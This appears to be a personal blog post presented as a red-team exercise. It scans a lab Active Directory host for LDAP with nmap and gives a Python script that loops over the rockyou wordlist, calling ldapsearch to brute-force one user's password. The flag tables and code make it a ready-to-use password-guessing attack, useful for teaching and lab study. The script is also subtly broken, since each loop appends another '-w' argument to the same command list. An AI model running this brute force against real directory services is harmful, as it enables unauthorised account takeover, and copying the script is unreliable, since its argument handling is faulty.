---
title: Brute Forcing Active Directory LDAP using a Custom Python Script
date: 2025-01-26
draft: false
author: Alex Jenkins
---


# Red Team
## Introduction
In this article we will perform a password guessing attack from the perspective of the adversary. The process begins by using **nmap** to scan the host and determine if the Lightweight Directory Access Protocol (LDAP) port is open. Once the LDAP service has been confirmed, a custom python script will be used to brute force a user's password with **ldapsearch**.

-  what is LDAP bind (related to ldapsearch)
- developing a python script

## Assumptions
For this red team exercise, it is assumed that the adversary has performed the initial reconnaissance stage. During that engagement they would have acquired an Active Directory (AD) username, discovered a domain, and located the host's IP address. The next logical step for the adversary is to identify a network entry point.

## LDAP Discovery
As discussed, the tool used to discover the LDAP port status will be nmap. Efforts have been made to ensure the nmap scan does not create too much noise - only scanning the relevant port and address, and revoking ICMP scans. A full example of the scan used during this engagement, including my specific output, and a description of each command is shown below:


**Input**

```
nmap -sT -Pn -p389 192.168.1.138
```

**Output**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 20:00 GMT
Nmap scan report for 192.168.1.138
Host is up (0.00049s latency).

PORT    STATE SERVICE
389/tcp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

**Description**

| Flag | Description                                                                                                                                                                        |
| ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| sT   | Performs a full three-way TCP handshake, mimicking the normal connection flow of applications and hopefully blending in with legitimate traffic.                                   |
| Pn   | Based on the assumptions, host discover is not required and ICMP requests can be deactivated. Ping scans are generally detected and blocked by firewalls.                          |
| p389 | Only scan the port of interest. Doing so creates less noise on the host than scanning the top 1,000 most common ports, with the additional benefit of being a faster scan overall. |
## Brute Force

```python
import subprocess

password_list = '/usr/share/wordlists/rockyou.txt'
username = 'scarab'
server = '192.168.1.138'

command = ['ldapsearch', 
           '-H', f'ldap://{server}',
           '-D', f'{username}',
           '-b', 'DC=backyard,DC=local',
           ]

with open(password_list) as wordlist:
    
    for password in wordlist:
    
        password = password.strip() # remove whitespace and newlines
        print(f'Trying {password}', end='\r')
        
        command += ['-w', password]
        output = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if output.returncode == 0: # LDAP auth success
            print(f'Matched {password}')
            break
```

Essentially all this python script does is use subprocess to run the ldapsearch tool repeatedly until it finds a password match. It's not super intelligent, if it doesn't find a match it won't tell you - we could modify it to do that but for this exercise this is fine. The script checks for the error code 0, which indicates a successful authentication and prints the matched password. The output is suppressed, but can be added back in by modifying the subprocess.run() function if required.

Now for the command. This is the command that's being run (with all the variables replaced with real values):

``` bash
ldapsearch -H "ldap://192.168.1.138" -D "scarab" -b "DC=backyard,DC=local" -w "abc123"
```

ldapsearch is used to query an LDAP server for directory information. In this case it's being used to validate credentials because any failed logins will return the following error message:

```
ldap_bind: Invalid credentials (49)
```

The command does the following:

| Flag | Description                                                                                                                                            |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -H   | Used to specify the LDAP server to connect with. This must be prefixed with *ldap://*, then followed with an IP address or domain name.                |
| -D   | The Distinguished Name (DN) of the user i.e. the username.                                                                                             |
| -w   | The password used to authenticate. Populated using a word-list in the for loop.                                                                        |
| -b   | The **base** Domain Name (DN) from which to begin the search. In this case I've chosen the root domain. Omitting this will result in "no such object". |

And that's it. The weak password policy and lack of lockout mechanisms made this a trivial exercise, allowing limitless attempts to authenticate into the user despite an array of failed logins.

I hope you enjoyed this example of password guessing using LDAP in Active Directory. The purpose of this was to be an introductory exercise using readily available services upon setup of an AD server. This is a trivial example of password guessing, but I feel it has effectively showcased this MITRE technique.

This was new to me and I had fun building the python script and learning a little bit about LDAP and how the ldapsearch tool works. 